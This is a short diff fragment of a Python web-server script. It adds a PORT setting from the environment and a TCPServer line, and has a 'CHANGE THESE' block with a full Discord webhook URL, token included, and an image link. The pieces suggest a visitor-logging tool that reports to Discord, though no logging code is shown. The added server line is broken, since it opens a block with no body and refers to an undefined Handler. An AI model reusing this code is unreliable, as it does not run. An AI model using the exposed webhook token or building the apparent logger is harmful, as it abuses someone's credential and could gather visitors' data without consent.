@@ -2,7 +2,10 @@ import http.server
 import socketserver
 import requests
 import datetime
+import os
 
+PORT = int(os.environ.get("PORT", 10000))
+with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as srv:
 # CHANGE THESE
 WEBHOOK = "https://discord.com/api/webhooks/1472620898107396118/-Kp-d19ezXwTxxl-lwfMrP8Xil6iCh38ys4EDgXqC_As_7yiybzzmTHFCJgvvYhy2HAb"
 IMAGE = "https://imgur.com/qSnlmy1"  # direct link
